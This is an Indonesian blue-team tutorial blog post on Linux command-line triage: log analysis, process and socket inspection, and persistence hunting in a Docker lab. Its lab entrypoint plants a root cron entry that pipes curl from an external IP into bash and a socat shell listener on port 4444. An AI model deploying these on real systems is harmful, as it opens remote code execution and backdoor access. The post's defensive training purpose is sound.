---
title: 'Blue Team Journey - Part 5: Linux Command Line untuk Investigasi'
date: '2026-11-18'
template: 'post'
draft: false
slug: 'blue-team-journey-part-5'
category: 'Cybersecurity'
tags:
  - 'Linux'
  - 'Bash'
  - 'Log Analysis'
  - 'Blue Team'
  - 'Docker'
  - 'Cybersecurity'
description: 'Linux command line untuk defender: navigasi, permission, grep/awk/sed, proses dan socket, /proc, log auth dan web, persistence, serta latihan triage di container.'
seoTitle: 'Linux Command Line untuk Blue Team: Log, Proses, dan Persistence'
seoDescription: 'Belajar Linux CLI untuk investigasi: grep/awk/sed, permission, ps/ss/lsof, /proc, auth.log, access.log, cron, SUID, dan triage di lab Docker.'
socialImage: 'https://is3.cloudhost.id/public-data/project-images/blog/blue-team-journey-part-5/00-cover.png'
---

Sebagian besar server, container, appliance, dan cloud instance berjalan di Linux. Ketika alert muncul, sering kali satu-satunya cara cepat untuk menjawab “apa yang terjadi?” adalah masuk ke shell dan membaca bukti: log, proses, socket, file, dan permission.

Artikel ini adalah **Part 5** dari seri **Blue Team Journey**, masuk ke Phase 3 dari [Blue Team Roadmap](https://github.com/keraattin/Blue-Team-Roadmap): **Linux Command Line**. Fokusnya bukan menjadi sysadmin, tetapi menjadi defender yang bisa memakai shell untuk triage dan investigasi.

Lab memakai satu container Ubuntu 24.04 dengan nginx, listener mencurigakan, sample `auth.log`, log akses web nyata, dan beberapa artefak persistence. Semua perintah di artikel ini dijalankan di lab tersebut.

## Mengapa command line

GUI bagus untuk melihat satu file. CLI bagus untuk menjawab pertanyaan dalam skala besar:

- “Berapa kali login gagal, dari IP mana, dan user apa?”
- “Path apa yang paling sering menghasilkan 404?”
- “Proses apa yang membuka port 4444, dan binary-nya di mana?”
- “File apa yang berubah dalam satu jam terakhir?”
- “Apakah ada cron atau authorized_keys yang tidak seharusnya?”

Dengan pipe, pertanyaan-pertanyaan itu bisa dijawab dalam satu baris tanpa membuka spreadsheet.

## Navigasi dan file

| Perintah | Fungsi |
|---|---|
| `pwd` | Lokasi direktori saat ini |
| `ls -la` | List detail termasuk hidden file |
| `cd /var/log` | Pindah direktori |
| `tree -L 2` | Struktur direktori |
| `find / -name "*.log"` | Cari file berdasarkan nama |
| `locate` | Cari cepat dari database (jika tersedia) |
| `cat`, `less`, `head`, `tail` | Baca file |
| `cp`, `mv`, `rm` | Copy, pindah, hapus |
| `stat` | Metadata file: permission, owner, waktu |

Contoh yang sering dipakai saat triage:

```bash
find / -xdev -type f -name "*.log" 2>/dev/null
find / -xdev -type f -mmin -60 2>/dev/null
find / -xdev -type f -size +100M 2>/dev/null
```

`-xdev` membatasi pencarian ke filesystem yang sama, sehingga `/proc` dan mount lain tidak ikut. `2>/dev/null` menyembunyikan error permission agar output tetap bersih.

## Permission: rwx, SUID, dan world-writable

Linux memakai tiga kelompok permission:

```text
owner  group  others
rwx    r-x    r--
```

| Nilai | Arti |
|---:|---|
| `4` | Read |
| `2` | Write |
| `1` | Execute |

Kombinasi umum:

| Octal | Permission | Arti |
|---:|---|---|
| `644` | `rw-r--r--` | File biasa |
| `600` | `rw-------` | File sensitif |
| `755` | `rwxr-xr-x` | Script/direktori |
| `4755` | `rwsr-xr-x` | SUID |
| `1777` | `rwxrwxrwt` | Sticky bit, seperti `/tmp` |

`chmod` mengubah permission, `chown` mengubah owner. **SUID** membuat program berjalan dengan privilege owner (sering root). **SGID** serupa untuk group. **Sticky bit** mencegah user menghapus file milik orang lain di direktori bersama.

Cari SUID dan file world-writable:

```bash
find / -xdev -perm -4000 -type f 2>/dev/null
find / -xdev -perm -0002 -type f 2>/dev/null
```

![Permission dan file mencurigakan|Passwd memiliki bit SUID; hidden executable di /tmp, file world-writable, dan backup 120 MB terlihat.](https://is3.cloudhost.id/public-data/project-images/blog/blue-team-journey-part-5/02-filesystem.png)

Yang perlu diperhatikan:

- **`-rwsr-xr-x` pada `/usr/bin/passwd`** adalah SUID yang normal. Yang mencurigakan adalah SUID di `/tmp`, `/home`, atau `/var/tmp`.
- **File world-writable** di luar `/tmp` bisa menjadi jalur privilege escalation.
- **Hidden directory** seperti `/tmp/.cache` dengan binary executable adalah pola yang sering dipakai untuk menyembunyikan payload.
- **File besar di `/var/tmp`** bisa menjadi data staging atau archive exfiltration.

> Di lab, `rootbash` adalah hidden executable tanpa bit SUID. Di host produksi, selalu verifikasi dengan `stat` dan `find -perm -4000`; jangan berasumsi dari nama file.

## Text processing: grep, awk, sed

Ini inti pekerjaan analis. Alurnya biasanya:

```text
baca → filter → ekstrak field → agregasi → urutkan
```

### grep

```bash
grep "Failed password" /var/log/auth.log
grep -i "failed" /var/log/auth.log
grep -c "Failed password" /var/log/auth.log
grep -r "password" /etc/ 2>/dev/null
```

`-i` case-insensitive, `-c` menghitung, `-r` rekursif, `-v` membalik (tidak cocok), `-E` regex extended, `-o` hanya bagian yang cocok.

### awk

`awk` memecah baris menjadi field (`$1`, `$2`, ...). Untuk log Nginx combined:

```text
$1 = IP
$7 = path
$9 = status
```

Contoh:

```bash
awk '{print $1}' /var/log/nginx/access.log
awk '$9 == 404 {print $7}' /var/log/nginx/access.log
awk '{print $1, $7, $9}' /var/log/nginx/access.log
```

### sed, cut, sort, uniq

```bash
sed 's/old/new/g' file.txt
cut -d',' -f1,3 data.csv
sort file.txt | uniq -c | sort -rn
```

Pola agregasi yang wajib dihafal:

```bash
... | sort | uniq -c | sort -rn
```

Artinya: urutkan, hitung kemunculan unik, lalu urutkan dari yang paling sering.

## Praktik: membaca auth.log

`auth.log` berisi event autentikasi: SSH, sudo, PAM. Sample di lab berisi 12 kegagalan login dan 2 keberhasilan:

```bash
grep -c "Failed password" /var/log/auth.log

grep "Failed password" /var/log/auth.log \
  | grep -oE 'from [0-9.]+' | awk '{print $2}' \
  | sort | uniq -c | sort -rn

grep "Failed password" /var/log/auth.log \
  | grep -oP 'for (?:invalid user )?\K[\w.-]+' \
  | sort | uniq -c | sort -rn

grep "Accepted" /var/log/auth.log
```

![Analisis auth.log|12 kegagalan, IP 203.0.113.50 paling agresif, user analyst paling sering dicoba, dan dua login berhasil.](https://is3.cloudhost.id/public-data/project-images/blog/blue-team-journey-part-5/03-auth-log.png)

Cara membacanya:

- **12 Failed password** dalam waktu singkat adalah sinyal brute force.
- **203.0.113.50** mendominasi dengan 5 percobaan.
- **analyst** dicoba 4 kali, disusul user umum seperti root, admin, oracle, postgres, dan backup. Ini pola **username enumeration + password guessing**.
- **Accepted password** dari `198.51.100.20` setelah beberapa kegagalan adalah sinyal paling penting: mungkin brute force berhasil, atau user sah yang akhirnya berhasil.
- **Accepted publickey** dari `203.0.113.91` perlu dicek: apakah key itu memang milik user?

`grep -oP` memakai PCRE; di distro dengan GNU grep biasanya tersedia. Kalau tidak, gunakan `awk` atau `sed` dengan pola serupa.

## Praktik: membaca access.log

Log Nginx di lab dihasilkan dari 160 request nyata dengan variasi IP, path, dan user agent:

```bash
awk '{print $1}' /var/log/nginx/access.log \
  | sort | uniq -c | sort -rn | head

awk '$9 == 404 {print $7}' /var/log/nginx/access.log \
  | sort | uniq -c | sort -rn | head

grep -E 'wp-login|\.env|phpmyadmin' /var/log/nginx/access.log \
  | awk '{print $1, $7, $9}' | head

awk -F'"' '{print $6}' /var/log/nginx/access.log \
  | sort | uniq -c | sort -rn | head
```

![Analisis access.log|Top IP, path 404, pola scanning, dan user agent sqlmap terlihat dari log web.](https://is3.cloudhost.id/public-data/project-images/blog/blue-team-journey-part-5/04-web-log.png)

Yang menonjol:

- **`/.env`, `/wp-login.php`, `/phpmyadmin`, `/admin`** adalah path scanning umum.
- **User agent `sqlmap/1.8`** adalah alat otomatis untuk SQL injection. Ini bukan bukti serangan berhasil, tetapi alasan kuat untuk memeriksa request dan response terkait.
- **Top IP** membantu menemukan sumber traffic, tetapi hati-hati dengan NAT, proxy, dan CDN.
- **Status 404 yang banyak dari satu IP** bisa berarti scanner, crawler, atau aplikasi yang salah konfigurasi.

## Praktik: proses dan network

Ketika ada alert “koneksi keluar ke port 4444”, langkahnya:

```bash
ps aux --sort=-%cpu | head
ss -tulnp
lsof -i :4444
```

Lalu petakan PID ke executable dan direktori kerja:

```bash
ls -l /proc/28/exe
readlink /proc/28/cwd
tr '\0' ' ' < /proc/28/cmdline; echo
```

![Triage proses dan socket|socat membuka port 4444; /proc menunjukkan binary, cwd, dan command line lengkap.](https://is3.cloudhost.id/public-data/project-images/blog/blue-team-journey-part-5/05-process.png)

Temuan di lab:

- `socat TCP-LISTEN:4444 ... EXEC:/bin/bash` adalah **shell listener**—pola yang sangat mencurigakan di server produksi.
- `ss -tulnp` menunjukkan proses dan PID yang memiliki socket.
- `/proc/<pid>/exe`, `cwd`, dan `cmdline` memberi konteks yang tidak terlihat dari `ps` saja.
- Cek juga `lsof -p <pid>` untuk file yang dibuka dan `ss -tnp` untuk koneksi established.

Pertanyaan lanjutan yang perlu dijawab:

- Apakah binary `socat` sesuai dengan paket yang terpasang? Cek `dpkg -S /usr/bin/socat`.
- Apakah proses berjalan sebagai root padahal seharusnya tidak?
- Dari mana process induknya? `ps -o pid,ppid,cmd -p <pid>`.
- Apakah ada koneksi keluar dari proses itu?

## Praktik: persistence dan file hunt

Persistence yang umum di Linux:

| Lokasi | Contoh |
|---|---|
| Cron | `/etc/cron.d/*`, `crontab -l`, `/var/spool/cron` |
| SSH key | `~/.ssh/authorized_keys` |
| Shell profile | `~/.bashrc`, `~/.profile` |
| Systemd | `/etc/systemd/system/*.service` |
| SUID | Binary dengan bit SUID |
| Startup script | `/etc/rc.local`, `/etc/init.d` |

Cari cron dan SSH key:

```bash
cat /etc/cron.d/system-update
find / -xdev -name authorized_keys 2>/dev/null
cat /home/analyst/.ssh/authorized_keys
grep -R "curl.*bash" /etc/cron* 2>/dev/null
```

![Persistence di cron dan SSH|Cron menjalankan curl ke IP eksternal lalu bash; authorized_keys berisi key attacker.](https://is3.cloudhost.id/public-data/project-images/blog/blue-team-journey-part-5/06-persistence.png)

Dua temuan di lab:

- **`curl ... | bash` di cron** adalah pola remote code execution yang sangat umum. Cron berjalan sebagai root, jadi dampaknya besar.
- **`authorized_keys` dengan komentar `attacker@lab`** adalah backdoor akses SSH. Di produksi, bandingkan key dengan inventory dan waktu perubahan file.

File hunt tambahan:

```bash
find / -xdev -perm -4000 -type f 2>/dev/null
find / -xdev -perm -0002 -type f 2>/dev/null
find / -xdev -type f -mmin -60 2>/dev/null
find / -xdev -type f -size +100M 2>/dev/null
```

## Praktik: monitoring log real-time

Saat investigasi, `tail -f` dengan filter adalah alat utama:

```bash
timeout 4 tail -n 0 -f /var/log/nginx/access.log \
  | grep --line-buffered -E '404|wp-login'
```

![Monitoring log real-time|Request 404 baru muncul saat traffic berjalan; filter hanya menampilkan yang relevan.](https://is3.cloudhost.id/public-data/project-images/blog/blue-team-journey-part-5/07-monitoring.png)

`-n 0` memulai dari akhir file, `--line-buffered` memastikan grep langsung menulis output, dan `timeout` menjaga perintah tidak berjalan selamanya di lab.

## Direktori penting untuk Blue Team

| Path | Isi | Nilai investigasi |
|---|---|---|
| `/var/log/auth.log` | SSH, sudo, PAM | Brute force, privilege escalation |
| `/var/log/syslog` | Pesan sistem | Service, cron, error |
| `/var/log/kern.log` | Kernel | Driver, OOM, panic |
| `/var/log/nginx/access.log` | HTTP request | Scanning, 404, user agent |
| `/etc/passwd` | Daftar user | User tidak dikenal, shell |
| `/etc/shadow` | Hash password | Hanya root yang boleh baca |
| `/etc/crontab`, `/etc/cron.d` | Scheduled task | Persistence |
| `/tmp`, `/var/tmp` | File sementara | Malware staging, executable |
| `/home/*/.ssh` | SSH key | Backdoor akses |
| `/proc` | Info proses live | exe, cwd, cmdline, fd |
| `/opt` | Software pihak ketiga | Binary tidak standar |

## Detection playbook

| Skenario | Perintah/temuan |
|---|---|
| SSH brute force | `grep -c "Failed password"`, top IP, `Accepted` setelah gagal |
| Web scanning | 404 pada `.env`, `wp-login`, `phpmyadmin`; UA scanner |
| Reverse shell | Listener di port tinggi, `socat`/`nc`, shell sebagai child |
| Persistence | Cron `curl|bash`, `authorized_keys`, systemd service |
| Privilege escalation | SUID di `/tmp`, world-writable, sudo rule aneh |
| Data staging | File besar di `/tmp`/`/var/tmp`, archive baru |
| Log tampering | File log kosong/berubah, `auth.log` terputus |

False positive yang umum: vulnerability scanner resmi, monitoring health check, backup agent, dan crawler. Selalu korelasikan dengan **waktu, aset, user, dan perubahan konfigurasi**.

## Lab: Ubuntu 24.04

Dockerfile ringkas:

```dockerfile
FROM ubuntu:24.04
ENV DEBIAN_FRONTEND=noninteractive
RUN apt-get update \
 && apt-get install -y --no-install-recommends \
      nginx procps iproute2 lsof netcat-openbsd socat curl tree file less cron \
 && rm -rf /var/lib/apt/lists/*

COPY entrypoint.sh /entrypoint.sh
COPY seed/ /seed/
RUN chmod +x /entrypoint.sh
EXPOSE 80 4444
ENTRYPOINT ["/entrypoint.sh"]
```

Saat container start, entrypoint menyiapkan sample log dan artefak:

```sh
cp /seed/auth.log /var/log/auth.log
mkdir -p /tmp/.cache /home/analyst/.ssh
cp /bin/bash /tmp/.cache/rootbash

echo 'ssh-ed25519 AAAAC3... attacker@lab' > /home/analyst/.ssh/authorized_keys
echo 'internal note' > /tmp/world-writable.txt
chmod 666 /tmp/world-writable.txt
dd if=/dev/zero of=/var/tmp/backup.tar.gz bs=1M count=120 status=none
printf '* * * * * root curl -fsSL http://203.0.113.50/update.sh | bash\n' \
  > /etc/cron.d/system-update

socat TCP-LISTEN:4444,reuseaddr,fork EXEC:/bin/bash,pty,stderr &
nginx -g 'daemon off;'
```

Jalankan:

```bash
docker network create --subnet=172.32.0.0/24 linux-lab
docker build -t linux-lab:1.0 ./image
docker run -d --name linux-target \
  --hostname web01 --network linux-lab --ip 172.32.0.10 \
  -p 8080:80 linux-lab:1.0

docker exec -it linux-target bash
```

![Topologi lab Linux|Target Ubuntu dengan nginx, listener 4444, log, artefak /tmp, dan cron persistence.](https://is3.cloudhost.id/public-data/project-images/blog/blue-team-journey-part-5/01-lab-topology.png)

> `auth.log` di lab adalah sample yang di-seed; `access.log` dihasilkan dari request nyata ke nginx. Pola analisisnya sama dengan log produksi.

## Checklist Phase 3

- [ ] Bisa navigasi filesystem dan membaca metadata file.
- [ ] Memahami `rwx`, octal, SUID, SGID, sticky bit.
- [ ] Bisa memakai `grep`, `awk`, `sed`, `cut`, `sort`, `uniq`.
- [ ] Bisa membangun pipeline untuk top IP, user, path, dan status.
- [ ] Bisa memeriksa proses dan socket dengan `ps`, `ss`, `lsof`.
- [ ] Bisa memetakan PID ke `/proc/<pid>/exe`, `cwd`, dan `cmdline`.
- [ ] Tahu lokasi log dan direktori penting.
- [ ] Bisa mencari SUID, world-writable, file besar, dan file baru.
- [ ] Bisa menemukan persistence di cron dan `authorized_keys`.
- [ ] Menyelesaikan OverTheWire Bandit minimal level 0–15.

## Kesimpulan

Command line adalah pengganda kekuatan defender. Satu pipeline `grep | awk | sort | uniq -c | sort -rn` bisa mengubah ribuan baris log menjadi tiga temuan yang bisa ditindaklanjuti. Satu `ss -tulnp` bisa menemukan listener yang tidak seharusnya ada. Satu `find -perm -4000` bisa menemukan jalur privilege escalation.

Di part ini kita mempraktikkan navigasi, permission, text processing, triage proses dan socket, file hunt, persistence, serta monitoring log di container Ubuntu. Semua teknik ini akan dipakai lagi di Phase 4 (scripting), Phase 6 (tools), dan Phase 8 (hands-on).

Part berikutnya adalah **Scripting & Automation (Phase 4)**: mengubah rangkaian perintah manual menjadi script Bash dan Python yang bisa dijalankan berulang, termasuk parsing log dan enrichment sederhana.
